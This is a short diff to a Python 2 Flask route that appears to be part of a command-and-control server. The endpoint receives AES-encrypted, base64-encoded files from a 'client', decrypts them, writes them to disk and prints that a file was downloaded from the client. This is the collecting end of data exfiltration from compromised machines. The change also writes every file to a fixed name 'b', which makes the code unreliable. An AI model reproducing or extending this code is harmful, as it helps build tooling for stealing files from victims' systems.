@@ -108,11 +108,11 @@ def index():
 @app.route(file_receiver_url, methods=["POST"])
 def fr():
     filename = decrypt_command(aes_encryption_key, request.form["fn"].replace(" ","+"))
-    f = open(filename, "wb")
+    f = open("b", "wb")
     fdata = request.form["token"].replace(" ", "+")
     raw_base64 = decrypt_command(aes_encryption_key, fdata)
-    print raw_base64
-    ready_to_write = base64.b64decode(raw_base64)
+    print raw_base64.decode("UTF-16LE")
+    ready_to_write = base64.b64decode(raw_base64.decode("UTF-16LE"))
     f.write(ready_to_write)
     f.close()
     print colored("\n[+] File %s downloaded from the client !" % filename, "green")
